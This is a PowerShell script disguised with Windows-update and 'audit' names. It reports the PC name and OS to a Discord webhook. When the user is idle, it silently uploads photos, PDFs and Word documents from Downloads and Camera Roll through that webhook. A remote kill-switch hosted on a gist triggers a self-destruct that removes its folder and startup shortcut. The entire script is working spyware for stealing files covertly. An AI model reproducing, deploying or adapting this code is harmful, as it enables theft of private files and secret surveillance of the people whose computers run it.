# --- CONFIGURATION ---
$WebhookUrl = "YOUR_DISCORD_WEBHOOK_URL"
$KillSwitchUrl = "https://gist.githubusercontent.com/09sychic/13dac0dcfbb36f84b5d779fae32010cd/raw/9faf55d8482fd73045b888027dd0bd39631737b2/status.txt"
# ---------------------

$Dir = "$env:LOCALAPPDATA\WinUpdateDiagnostic"
$LogFile = "$Dir\LocalAudit.dat"
$Paths = @("$env:USERPROFILE\Downloads", "$env:USERPROFILE\Pictures\Camera Roll")

function Invoke-SelfDestruct {
    $lnk = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdateAssistant.lnk"
    if (Test-Path $lnk) { Remove-Item $lnk -Force }
    Start-Process cmd -ArgumentList "/c timeout /t 5 && rd /s /q `"$Dir`"" -WindowStyle Hidden
    exit
}

# 1. Check-in Notification
try {
    $statusMsg = "[SYSTEM AUDIT START]`nPC: $env:COMPUTERNAME`nOS: $((Get-CimInstance Win32_OperatingSystem).Caption)"
    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body (@{content = $statusMsg } | ConvertTo-Json) -ContentType "application/json"
}
catch {}

if (-not (Test-Path $LogFile)) { New-Item -ItemType File -Path $LogFile -Force }

# Define Idle Check Type once
if (-not ([System.Management.Automation.PSTypeName]"Win32.Win32Idle").Type) {
    Add-Type -MemberDefinition @'
        [DllImport("user32.dll")] public static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
        [StructLayout(LayoutKind.Sequential)] public struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }
'@ -Name "Win32Idle" -Namespace Win32
}

while ($true) {
    try {
        # 2. REMOTE KILL-SWITCH CHECK
        $Status = (Invoke-WebRequest -Uri $KillSwitchUrl -UseBasicParsing -TimeoutSec 10).Content.Trim()
        if ($Status -eq "OFFLINE") {
            Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body (@{content = "[SYSTEM] Remote kill-switch triggered. Executing self-destruct." } | ConvertTo-Json) -ContentType "application/json"
            Invoke-SelfDestruct
        }

        # 3. IDLE STATUS CHECK (180,000ms = 3 Minutes)
        $lii = New-Object Win32.Win32Idle+LASTINPUTINFO
        $lii.cbSize = [System.Runtime.InteropServices.Marshal]::SizeOf($lii)
        
        if ([Win32.Win32Idle]::GetLastInputInfo([ref]$lii)) {
            $idleMillis = [Environment]::TickCount - $lii.dwTime
            if ($idleMillis -gt 180000) { 
                
                # 4. PERFORM AUDIT
                $Uploaded = @{}
                if (Test-Path $LogFile) { Get-Content $LogFile | ForEach-Object { $Uploaded[$_] = $true } }

                foreach ($p in $Paths) {
                    if (Test-Path $p) {
                        Get-ChildItem -Path $p -File | ForEach-Object {
                            $f = $_
                            $SizeMB = [math]::Round($f.Length / 1MB, 2)
                            $Key = "$($f.Name)|$SizeMB|$($f.LastWriteTimeUtc)"

                            if (-not $Uploaded[$Key] -and $SizeMB -le 24) {
                                $Ext = $f.Extension.ToLower()
                                if (".jpg", ".jpeg", ".png", ".pdf", ".docx" -contains $Ext) {
                                    $payload = "{\`"content\`": \`"[AUDIT LOG] Object: $($f.Name) (Size: $SizeMB MB)\`"}"
                                    curl.exe -s -F "payload_json=$payload" -F "file=@$($f.FullName)" $WebhookUrl
                                    $Key | Out-File -Append -FilePath $LogFile
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    catch {}
    
    # Check every 5 minutes
    Start-Sleep -Seconds 300 
}